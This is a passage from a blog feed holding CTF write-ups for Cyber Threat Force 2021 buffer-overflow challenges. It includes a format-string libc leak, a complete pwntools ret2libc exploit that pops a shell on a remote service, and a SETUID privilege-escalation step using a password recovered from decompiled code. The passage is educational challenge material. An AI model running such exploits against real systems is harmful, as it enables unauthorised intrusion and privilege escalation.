&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-bash" data-lang="bash">$ cyclic &lt;span style="color:#ae81ff">100&lt;/span>
aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa
$ gdb ./service
...
gefâž¤ r
Starting program: /home/vivescere/ctf/bof_2/service
Hello authentifie toi !
Username: a
Bienvenue a
password: aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa
...
â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ threads â”€â”€â”€â”€
&lt;span style="color:#f92672">[&lt;/span>&lt;span style="color:#75715e">#0] Id 1, Name: &amp;#34;service&amp;#34;, stopped 0x6e616161 in ?? (), reason: SIGSEGV&lt;/span>
â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ trace â”€â”€â”€â”€
â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
gefâž¤ q
$ cyclic -l 0x6e616161
&lt;span style="color:#ae81ff">49&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>Now we need to figure out the version of the libc that was used on the remote server. To do that, we&amp;rsquo;re going to leak a few addresses from the stack.&lt;/p>
&lt;p>Using a simple script (could also have been done in GDB), we can find out which addresses come from the libc (knowing that on my system and for this executable, the libc starts at &lt;code>0xf7cad000&lt;/code>).&lt;/p>
&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#75715e">#!/usr/bin/env python3&lt;/span>
&lt;span style="color:#f92672">from&lt;/span> pwn &lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#f92672">*&lt;/span>
context&lt;span style="color:#f92672">.&lt;/span>log_level &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">&amp;#39;ERROR&amp;#39;&lt;/span>
exe &lt;span style="color:#f92672">=&lt;/span> ELF(&lt;span style="color:#e6db74">&amp;#34;./service&amp;#34;&lt;/span>, checksec&lt;span style="color:#f92672">=&lt;/span>False)
context&lt;span style="color:#f92672">.&lt;/span>binary &lt;span style="color:#f92672">=&lt;/span> exe
context&lt;span style="color:#f92672">.&lt;/span>terminal &lt;span style="color:#f92672">=&lt;/span> [&lt;span style="color:#e6db74">&amp;#39;konsole&amp;#39;&lt;/span>, &lt;span style="color:#e6db74">&amp;#39;-e&amp;#39;&lt;/span>]
&lt;span style="color:#66d9ef">for&lt;/span> i &lt;span style="color:#f92672">in&lt;/span> range(&lt;span style="color:#ae81ff">1&lt;/span>, &lt;span style="color:#ae81ff">1000&lt;/span>):
r &lt;span style="color:#f92672">=&lt;/span> process([exe&lt;span style="color:#f92672">.&lt;/span>path])
r&lt;span style="color:#f92672">.&lt;/span>recvuntil(&lt;span style="color:#e6db74">&amp;#39;: &amp;#39;&lt;/span>)
r&lt;span style="color:#f92672">.&lt;/span>sendline(&lt;span style="color:#e6db74">b&lt;/span>&lt;span style="color:#e6db74">&amp;#39;%&amp;#39;&lt;/span> &lt;span style="color:#f92672">+&lt;/span> str(i)&lt;span style="color:#f92672">.&lt;/span>encode() &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#e6db74">b&lt;/span>&lt;span style="color:#e6db74">&amp;#39;$p-&amp;#39;&lt;/span>)
greeting &lt;span style="color:#f92672">=&lt;/span> r&lt;span style="color:#f92672">.&lt;/span>recvuntil(&lt;span style="color:#e6db74">&amp;#39;: &amp;#39;&lt;/span>)
&lt;span style="color:#66d9ef">try&lt;/span>:
leaked_addr &lt;span style="color:#f92672">=&lt;/span> int(greeting&lt;span style="color:#f92672">.&lt;/span>split(&lt;span style="color:#e6db74">b&lt;/span>&lt;span style="color:#e6db74">&amp;#39;-&amp;#39;&lt;/span>)[&lt;span style="color:#ae81ff">0&lt;/span>]&lt;span style="color:#f92672">.&lt;/span>split(&lt;span style="color:#e6db74">b&lt;/span>&lt;span style="color:#e6db74">&amp;#39; &amp;#39;&lt;/span>)[&lt;span style="color:#f92672">-&lt;/span>&lt;span style="color:#ae81ff">1&lt;/span>]&lt;span style="color:#f92672">.&lt;/span>decode(), &lt;span style="color:#ae81ff">16&lt;/span>)
&lt;span style="color:#66d9ef">except&lt;/span>:
leaked_addr &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#f92672">-&lt;/span>&lt;span style="color:#ae81ff">1&lt;/span>
&lt;span style="color:#66d9ef">if&lt;/span> hex(leaked_addr)&lt;span style="color:#f92672">.&lt;/span>startswith(&lt;span style="color:#e6db74">&amp;#39;0xf7&amp;#39;&lt;/span>):
&lt;span style="color:#66d9ef">print&lt;/span>(&lt;span style="color:#e6db74">b&lt;/span>&lt;span style="color:#e6db74">&amp;#39;%&amp;#39;&lt;/span> &lt;span style="color:#f92672">+&lt;/span> str(i)&lt;span style="color:#f92672">.&lt;/span>encode() &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#e6db74">b&lt;/span>&lt;span style="color:#e6db74">&amp;#39;$p&amp;#39;&lt;/span>, hex(leaked_addr))
r&lt;span style="color:#f92672">.&lt;/span>close()
&lt;/code>&lt;/pre>&lt;/div>&lt;p>We can quickly identify the addresses that we get using GDB (&lt;code>info symbol [addr]&lt;/code>):&lt;/p>
&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-bash" data-lang="bash">%2$p 0xf7f64540 _IO_2_1_stdin_
...
%43$p 0xf7dc0a0d __libc_start_main
&lt;/code>&lt;/pre>&lt;/div>&lt;p>.. now we can do the same on the remote host, and plug the values into the &lt;a href="https://libc.blukat.me">libc database search&lt;/a> website. After entering these values:&lt;/p>
&lt;pre>&lt;code>__libc_start_main_ret -&amp;gt; b41
_IO_2_1_stdin_ -&amp;gt; 5c0
&lt;/code>&lt;/pre>&lt;p>We get four possible versions. I tested them all until one worked (using the exploit below). The correct version (or at least a compatible one) was &lt;code>libc6-i386_2.28-10_amd64&lt;/code>.&lt;/p>
&lt;p>Now that we know all of this, the exploit needs to 1. leak an address so that we can defeat ASLR and 2. build a simple ropchain to pop a shell.&lt;/p>
&lt;p>Here is the exploit script:&lt;/p>
&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#75715e">#!/usr/bin/env python3&lt;/span>
&lt;span style="color:#f92672">from&lt;/span> pwn &lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#f92672">*&lt;/span>
exe &lt;span style="color:#f92672">=&lt;/span> ELF(&lt;span style="color:#e6db74">&amp;#34;./service&amp;#34;&lt;/span>)
context&lt;span style="color:#f92672">.&lt;/span>binary &lt;span style="color:#f92672">=&lt;/span> exe
context&lt;span style="color:#f92672">.&lt;/span>terminal &lt;span style="color:#f92672">=&lt;/span> [&lt;span style="color:#e6db74">&amp;#39;konsole&amp;#39;&lt;/span>, &lt;span style="color:#e6db74">&amp;#39;-e&amp;#39;&lt;/span>]
&lt;span style="color:#66d9ef">def&lt;/span> &lt;span style="color:#a6e22e">conn&lt;/span>():
&lt;span style="color:#66d9ef">if&lt;/span> args&lt;span style="color:#f92672">.&lt;/span>LOCAL:
r &lt;span style="color:#f92672">=&lt;/span> process([exe&lt;span style="color:#f92672">.&lt;/span>path])
&lt;span style="color:#66d9ef">else&lt;/span>:
r &lt;span style="color:#f92672">=&lt;/span> remote(&lt;span style="color:#e6db74">&amp;#34;XXX.XXX.XXX.XXX&amp;#34;&lt;/span>, &lt;span style="color:#ae81ff">00000&lt;/span>)
&lt;span style="color:#66d9ef">return&lt;/span> r
&lt;span style="color:#75715e"># libc6-i386_2.28-10_amd64&lt;/span>
libc_config &lt;span style="color:#f92672">=&lt;/span> {
&lt;span style="color:#e6db74">&amp;#39;io_2_1_stdin&amp;#39;&lt;/span>: &lt;span style="color:#ae81ff">0x001da5c0&lt;/span>,
&lt;span style="color:#e6db74">&amp;#39;system&amp;#39;&lt;/span>: &lt;span style="color:#ae81ff">0x0003e9e0&lt;/span>,
&lt;span style="color:#e6db74">&amp;#39;str_bin_sh&amp;#39;&lt;/span>: &lt;span style="color:#ae81ff">0x17eaaa&lt;/span>,
}
&lt;span style="color:#66d9ef">def&lt;/span> &lt;span style="color:#a6e22e">main&lt;/span>():
r &lt;span style="color:#f92672">=&lt;/span> conn()
r&lt;span style="color:#f92672">.&lt;/span>recvuntil(&lt;span style="color:#e6db74">&amp;#39;: &amp;#39;&lt;/span>)
r&lt;span style="color:#f92672">.&lt;/span>sendline(&lt;span style="color:#e6db74">b&lt;/span>&lt;span style="color:#e6db74">&amp;#39;%2$p-&amp;#39;&lt;/span>)
greeting &lt;span style="color:#f92672">=&lt;/span> r&lt;span style="color:#f92672">.&lt;/span>recvuntil(&lt;span style="color:#e6db74">&amp;#39;: &amp;#39;&lt;/span>)
leaked_io_2_1_stdin &lt;span style="color:#f92672">=&lt;/span> int(greeting&lt;span style="color:#f92672">.&lt;/span>split(&lt;span style="color:#e6db74">b&lt;/span>&lt;span style="color:#e6db74">&amp;#39;-&amp;#39;&lt;/span>)[&lt;span style="color:#ae81ff">0&lt;/span>]&lt;span style="color:#f92672">.&lt;/span>split(&lt;span style="color:#e6db74">b&lt;/span>&lt;span style="color:#e6db74">&amp;#39; &amp;#39;&lt;/span>)[&lt;span style="color:#f92672">-&lt;/span>&lt;span style="color:#ae81ff">1&lt;/span>]&lt;span style="color:#f92672">.&lt;/span>decode(), &lt;span style="color:#ae81ff">16&lt;/span>)
libc_address &lt;span style="color:#f92672">=&lt;/span> leaked_io_2_1_stdin &lt;span style="color:#f92672">-&lt;/span> libc_config[&lt;span style="color:#e6db74">&amp;#39;io_2_1_stdin&amp;#39;&lt;/span>]
sys &lt;span style="color:#f92672">=&lt;/span> p32(libc_address &lt;span style="color:#f92672">+&lt;/span> libc_config[&lt;span style="color:#e6db74">&amp;#39;system&amp;#39;&lt;/span>])
sh &lt;span style="color:#f92672">=&lt;/span> p32(libc_address &lt;span style="color:#f92672">+&lt;/span> libc_config[&lt;span style="color:#e6db74">&amp;#39;str_bin_sh&amp;#39;&lt;/span>])
r&lt;span style="color:#f92672">.&lt;/span>sendline(flat({&lt;span style="color:#ae81ff">49&lt;/span>: sys &lt;span style="color:#f92672">+&lt;/span> p32(&lt;span style="color:#ae81ff">0xcafebabe&lt;/span>) &lt;span style="color:#f92672">+&lt;/span> sh}))
r&lt;span style="color:#f92672">.&lt;/span>interactive()
&lt;span style="color:#66d9ef">if&lt;/span> __name__ &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#e6db74">&amp;#34;__main__&amp;#34;&lt;/span>:
main()
&lt;/code>&lt;/pre>&lt;/div>&lt;p>The flag was in &lt;code>/home/ctf/flag.txt&lt;/code>: &lt;code>CYBERTF{l3@ks_I5_Us3Fu11}&lt;/code>.&lt;/p>
&lt;h2 id="level-2-privesc">Level 2: PrivEsc&lt;/h2>
&lt;p>Looking in &lt;code>/bin&lt;/code> again, we find a &lt;code>readline&lt;/code> SETUID binary. I used the same snippet to download the file:&lt;/p>
&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#66d9ef">def&lt;/span> &lt;span style="color:#a6e22e">main&lt;/span>():
r &lt;span style="color:#f92672">=&lt;/span> conn()
r&lt;span style="color:#f92672">.&lt;/span>recvuntil(&lt;span style="color:#e6db74">&amp;#39;: &amp;#39;&lt;/span>)
r&lt;span style="color:#f92672">.&lt;/span>sendline(&lt;span style="color:#e6db74">b&lt;/span>&lt;span style="color:#e6db74">&amp;#39;%2$p-&amp;#39;&lt;/span>)
greeting &lt;span style="color:#f92672">=&lt;/span> r&lt;span style="color:#f92672">.&lt;/span>recvuntil(&lt;span style="color:#e6db74">&amp;#39;: &amp;#39;&lt;/span>)
leaked_io_2_1_stdin &lt;span style="color:#f92672">=&lt;/span> int(greeting&lt;span style="color:#f92672">.&lt;/span>split(&lt;span style="color:#e6db74">b&lt;/span>&lt;span style="color:#e6db74">&amp;#39;-&amp;#39;&lt;/span>)[&lt;span style="color:#ae81ff">0&lt;/span>]&lt;span style="color:#f92672">.&lt;/span>split(&lt;span style="color:#e6db74">b&lt;/span>&lt;span style="color:#e6db74">&amp;#39; &amp;#39;&lt;/span>)[&lt;span style="color:#f92672">-&lt;/span>&lt;span style="color:#ae81ff">1&lt;/span>]&lt;span style="color:#f92672">.&lt;/span>decode(), &lt;span style="color:#ae81ff">16&lt;/span>)
libc_address &lt;span style="color:#f92672">=&lt;/span> leaked_io_2_1_stdin &lt;span style="color:#f92672">-&lt;/span> libc_config[&lt;span style="color:#e6db74">&amp;#39;io_2_1_stdin&amp;#39;&lt;/span>]
sys &lt;span style="color:#f92672">=&lt;/span> p32(libc_address &lt;span style="color:#f92672">+&lt;/span> libc_config[&lt;span style="color:#e6db74">&amp;#39;system&amp;#39;&lt;/span>])
sh &lt;span style="color:#f92672">=&lt;/span> p32(libc_address &lt;span style="color:#f92672">+&lt;/span> libc_config[&lt;span style="color:#e6db74">&amp;#39;str_bin_sh&amp;#39;&lt;/span>])
r&lt;span style="color:#f92672">.&lt;/span>sendline(flat({&lt;span style="color:#ae81ff">49&lt;/span>: sys &lt;span style="color:#f92672">+&lt;/span> p32(&lt;span style="color:#ae81ff">0xcafebabe&lt;/span>) &lt;span style="color:#f92672">+&lt;/span> sh}))
&lt;span style="color:#66d9ef">with&lt;/span> open(&lt;span style="color:#e6db74">&amp;#39;readline&amp;#39;&lt;/span>, &lt;span style="color:#e6db74">&amp;#39;wb&amp;#39;&lt;/span>) &lt;span style="color:#66d9ef">as&lt;/span> f:
r&lt;span style="color:#f92672">.&lt;/span>sendline(&lt;span style="color:#e6db74">&amp;#39;cat /bin/readline&amp;#39;&lt;/span>)
r&lt;span style="color:#f92672">.&lt;/span>sendline(&lt;span style="color:#e6db74">&amp;#39;exit&amp;#39;&lt;/span>)
f&lt;span style="color:#f92672">.&lt;/span>write(r&lt;span style="color:#f92672">.&lt;/span>recvall())
&lt;/code>&lt;/pre>&lt;/div>&lt;p>We can look at the binary in Ghidra:&lt;/p>
&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-c" data-lang="c">undefined8 &lt;span style="color:#a6e22e">main&lt;/span>(&lt;span style="color:#66d9ef">int&lt;/span> param_1,&lt;span style="color:#66d9ef">long&lt;/span> param_2) {
&lt;span style="color:#66d9ef">int&lt;/span> iVar1;
size_t sVar2;
undefined8 uVar3;
FILE &lt;span style="color:#f92672">*&lt;/span>__stream;
&lt;span style="color:#66d9ef">char&lt;/span> &lt;span style="color:#f92672">*&lt;/span>pcVar4;
&lt;span style="color:#66d9ef">long&lt;/span> lVar5;
undefined8 &lt;span style="color:#f92672">*&lt;/span>puVar6;
&lt;span style="color:#66d9ef">long&lt;/span> in_FS_OFFSET;
byte bVar7;
undefined8 local_426;
undefined4 local_41e;
undefined2 local_41a;
undefined8 local_418;
undefined8 local_410;
undefined8 local_408 [&lt;span style="color:#ae81ff">127&lt;/span>];
&lt;span style="color:#66d9ef">long&lt;/span> local_10;
bVar7 &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>;
local_10 &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#f92672">*&lt;/span>(&lt;span style="color:#66d9ef">long&lt;/span> &lt;span style="color:#f92672">*&lt;/span>)(in_FS_OFFSET &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#ae81ff">0x28&lt;/span>);
setreuid(&lt;span style="color:#ae81ff">0x3e9&lt;/span>,&lt;span style="color:#ae81ff">0x3e9&lt;/span>);
&lt;span style="color:#66d9ef">if&lt;/span> (param_1 &lt;span style="color:#f92672">!=&lt;/span> &lt;span style="color:#ae81ff">3&lt;/span>) {
&lt;span style="color:#75715e">/* WARNING: Subroutine does not return */&lt;/span>
exit(&lt;span style="color:#ae81ff">1&lt;/span>);
}
local_426 &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0xaa333231efbeadde&lt;/span>;
local_41e &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0xc0ddccbb&lt;/span>;
local_41a &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0xeeff&lt;/span>;
puts(&lt;span style="color:#e6db74">&amp;#34;&amp;#34;&lt;/span>);
sVar2 &lt;span style="color:#f92672">=&lt;/span> strlen(&lt;span style="color:#f92672">*&lt;/span>(&lt;span style="color:#66d9ef">char&lt;/span> &lt;span style="color:#f92672">**&lt;/span>)(param_2 &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#ae81ff">8&lt;/span>));
&lt;span style="color:#66d9ef">if&lt;/span> (sVar2 &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#ae81ff">0xe&lt;/span>) {
iVar1 &lt;span style="color:#f92672">=&lt;/span> check(&lt;span style="color:#f92672">&amp;amp;&lt;/span>local_426,&lt;span style="color:#f92672">*&lt;/span>(undefined8 &lt;span style="color:#f92672">*&lt;/span>)(param_2 &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#ae81ff">8&lt;/span>),&lt;span style="color:#ae81ff">0xe&lt;/span>,&lt;span style="color:#f92672">*&lt;/span>(undefined8 &lt;span style="color:#f92672">*&lt;/span>)(param_2 &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#ae81ff">8&lt;/span>));
&lt;span style="color:#66d9ef">if&lt;/span> (iVar1 &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>) {
puts(&lt;span style="color:#e6db74">&amp;#34;Password check&amp;#34;&lt;/span>);
local_418 &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>;
local_410 &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>;
lVar5 &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0x7e&lt;/span>;
puVar6 &lt;span style="color:#f92672">=&lt;/span> local_408;
&lt;span style="color:#66d9ef">while&lt;/span> (lVar5 &lt;span style="color:#f92672">!=&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>) {
lVar5 &lt;span style="color:#f92672">=&lt;/span> lVar5 &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#f92672">-&lt;/span>&lt;span style="color:#ae81ff">1&lt;/span>;
&lt;span style="color:#f92672">*&lt;/span>puVar6 &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>;
puVar6 &lt;span style="color:#f92672">=&lt;/span> puVar6 &lt;span style="color:#f92672">+&lt;/span> (ulong)bVar7 &lt;span style="color:#f92672">*&lt;/span> &lt;span style="color:#f92672">-&lt;/span>&lt;span style="color:#ae81ff">2&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#ae81ff">1&lt;/span>;
}
__stream &lt;span style="color:#f92672">=&lt;/span> fopen(&lt;span style="color:#f92672">*&lt;/span>(&lt;span style="color:#66d9ef">char&lt;/span> &lt;span style="color:#f92672">**&lt;/span>)(param_2 &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#ae81ff">0x10&lt;/span>),&lt;span style="color:#e6db74">&amp;#34;r&amp;#34;&lt;/span>);
&lt;span style="color:#66d9ef">while&lt;/span>( true ) {
pcVar4 &lt;span style="color:#f92672">=&lt;/span> fgets((&lt;span style="color:#66d9ef">char&lt;/span> &lt;span style="color:#f92672">*&lt;/span>)&lt;span style="color:#f92672">&amp;amp;&lt;/span>local_418,&lt;span style="color:#ae81ff">0x400&lt;/span>,__stream);
&lt;span style="color:#66d9ef">if&lt;/span> (pcVar4 &lt;span style="color:#f92672">==&lt;/span> (&lt;span style="color:#66d9ef">char&lt;/span> &lt;span style="color:#f92672">*&lt;/span>)&lt;span style="color:#ae81ff">0x0&lt;/span>) &lt;span style="color:#66d9ef">break&lt;/span>;
puts((&lt;span style="color:#66d9ef">char&lt;/span> &lt;span style="color:#f92672">*&lt;/span>)&lt;span style="color:#f92672">&amp;amp;&lt;/span>local_418);
}
uVar3 &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>;
}
&lt;span style="color:#66d9ef">else&lt;/span> {
puts(&lt;span style="color:#e6db74">&amp;#34;Password failed&amp;#34;&lt;/span>);
uVar3 &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">1&lt;/span>;
}
}
&lt;span style="color:#66d9ef">else&lt;/span> {
uVar3 &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">1&lt;/span>;
}
&lt;span style="color:#66d9ef">if&lt;/span> (local_10 &lt;span style="color:#f92672">!=&lt;/span> &lt;span style="color:#f92672">*&lt;/span>(&lt;span style="color:#66d9ef">long&lt;/span> &lt;span style="color:#f92672">*&lt;/span>)(in_FS_OFFSET &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#ae81ff">0x28&lt;/span>)) {
&lt;span style="color:#75715e">/* WARNING: Subroutine does not return */&lt;/span>
__stack_chk_fail();
}
&lt;span style="color:#66d9ef">return&lt;/span> uVar3;
}
&lt;span style="color:#66d9ef">int&lt;/span> &lt;span style="color:#a6e22e">check&lt;/span>(&lt;span style="color:#66d9ef">long&lt;/span> param_1,&lt;span style="color:#66d9ef">long&lt;/span> param_2,ulong param_3) {
ulong local_10;
local_10 &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>;
&lt;span style="color:#66d9ef">while&lt;/span>( true ) {
&lt;span style="color:#66d9ef">if&lt;/span> (param_3 &lt;span style="color:#f92672">&amp;lt;=&lt;/span> local_10) {
&lt;span style="color:#66d9ef">return&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>;
}
&lt;span style="color:#66d9ef">if&lt;/span> (&lt;span style="color:#f92672">*&lt;/span>(&lt;span style="color:#66d9ef">char&lt;/span> &lt;span style="color:#f92672">*&lt;/span>)(local_10 &lt;span style="color:#f92672">+&lt;/span> param_1) &lt;span style="color:#f92672">!=&lt;/span> &lt;span style="color:#f92672">*&lt;/span>(&lt;span style="color:#66d9ef">char&lt;/span> &lt;span style="color:#f92672">*&lt;/span>)(local_10 &lt;span style="color:#f92672">+&lt;/span> param_2)) &lt;span style="color:#66d9ef">break&lt;/span>;
local_10 &lt;span style="color:#f92672">=&lt;/span> local_10 &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#ae81ff">1&lt;/span>;
}
&lt;span style="color:#66d9ef">return&lt;/span> (&lt;span style="color:#66d9ef">int&lt;/span>)&lt;span style="color:#f92672">*&lt;/span>(&lt;span style="color:#66d9ef">char&lt;/span> &lt;span style="color:#f92672">*&lt;/span>)(local_10 &lt;span style="color:#f92672">+&lt;/span> param_1) &lt;span style="color:#f92672">-&lt;/span> (&lt;span style="color:#66d9ef">int&lt;/span>)&lt;span style="color:#f92672">*&lt;/span>(&lt;span style="color:#66d9ef">char&lt;/span> &lt;span style="color:#f92672">*&lt;/span>)(local_10 &lt;span style="color:#f92672">+&lt;/span> param_2);
}
&lt;/code>&lt;/pre>&lt;/div>&lt;p>The program basically takes two arguments: a password, and a file path. If the password is correct, then the file content will be printed out.&lt;/p>
&lt;p>The &lt;code>check&lt;/code> function is basically a &lt;code>strcmp&lt;/code> clone, so the password is contained in &lt;code>local_426&lt;/code>. Ghidra errors out a bit here, &lt;code>local_426&lt;/code>, &lt;code>local_41e&lt;/code> and &lt;code>local_41a&lt;/code> are all the same variable.&lt;/p>
&lt;p>Knowing this, we can now get the flag (which is in the home of the binary owner):&lt;/p>
&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-bash" data-lang="bash">$ /bin/readline &lt;span style="color:#66d9ef">$(&lt;/span>perl -e &lt;span style="color:#e6db74">&amp;#39;print &amp;#34;\xde\xad\xbe\xef\x31\x32\x33\xaa\xbb\xcc\xdd\xc0\xff\xee /home/ctf_cracked/flag.txt&amp;#34;&amp;#39;&lt;/span>&lt;span style="color:#66d9ef">)&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>The flag is &lt;code>CYBERTF{None_asciiPrint@ble:p}&lt;/code>.&lt;/p>
&lt;h2 id="more">More&lt;/h2>
&lt;p>You can &lt;a href="https://github.com/vivescere/ctf/tree/main/cyber-threat-force-2021/pwn/bof2">view the sources on github&lt;/a> or &lt;a href="https://nicolasb.fr/blog/cyber-threat-force-ctf/">read other writeups&lt;/a>.&lt;/p></content></item><item><title>Writeup Cyber Threat Force : bof_1 (with GetShell &amp; PrivEsc)</title><link>https://nicolasb.fr/blog/writeup-cyber-threat-force-2021-pwn-bof-1/</link><pubDate>Wed, 07 Jul 2021 19:12:09 +0100</pubDate><guid>https://nicolasb.fr/blog/writeup-cyber-threat-force-2021-pwn-bof-1/</guid><description>For this challenge, we were given a service executable. It was also hosted remotely.
NOTE: since I&amp;rsquo;m writting this after the CTF ended, the demos are done locally.
Level 1 $ checksec service [*] &amp;#39;/home/vivescere/ctf/bof_1/service&amp;#39; Arch: amd64-64-little RELRO: Partial RELRO Stack: Canary found NX: NX enabled PIE: No PIE (0x400000) $ ./service hello who are you? vivescere Hello vivescere We do have NX enabled, along with canaries and partial RELRO. Also, the executable is statically linked, meaning we won&amp;rsquo;t have access to the libc easily.</description><content>&lt;p>For this challenge, we were given a service executable. It was also hosted remotely.&lt;/p>
&lt;p>NOTE: since I&amp;rsquo;m writting this after the CTF ended, the demos are done locally.&lt;/p>
&lt;h2 id="level-1">Level 1&lt;/h2>
&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-bash" data-lang="bash">$ checksec service
&lt;span style="color:#f92672">[&lt;/span>*&lt;span style="color:#f92672">]&lt;/span> &lt;span style="color:#e6db74">&amp;#39;/home/vivescere/ctf/bof_1/service&amp;#39;&lt;/span>
Arch: amd64-64-little
RELRO: Partial RELRO
Stack: Canary found
NX: NX enabled
PIE: No PIE &lt;span style="color:#f92672">(&lt;/span>0x400000&lt;span style="color:#f92672">)&lt;/span>
$ ./service
hello who are you?
vivescere
Hello vivescere
&lt;/code>&lt;/pre>&lt;/div>&lt;p>We do have NX enabled, along with canaries and partial RELRO. Also, the executable is statically linked, meaning we won&amp;rsquo;t have access to the libc easily. Using Ghidra, we can look at the main function:&lt;/p>
&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-c" data-lang="c">undefined8 &lt;span style="color:#a6e22e">main&lt;/span>(&lt;span style="color:#66d9ef">void&lt;/span>) {
undefined8 local_38;
undefined8 local_30;
undefined8 local_28;
undefined8 local_20;
undefined8 local_18;
ignorMe();
local_38 &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>;
local_30 &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>;
local_28 &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>;
local_20 &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>;
local_18 &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>;
puts(&lt;span style="color:#e6db74">&amp;#34;hello who are you?&amp;#34;&lt;/span>);
__isoc99_scanf(&lt;span style="color:#f92672">&amp;amp;&lt;/span>DAT_0049f052,&lt;span style="color:#f92672">&amp;amp;&lt;/span>local_38);
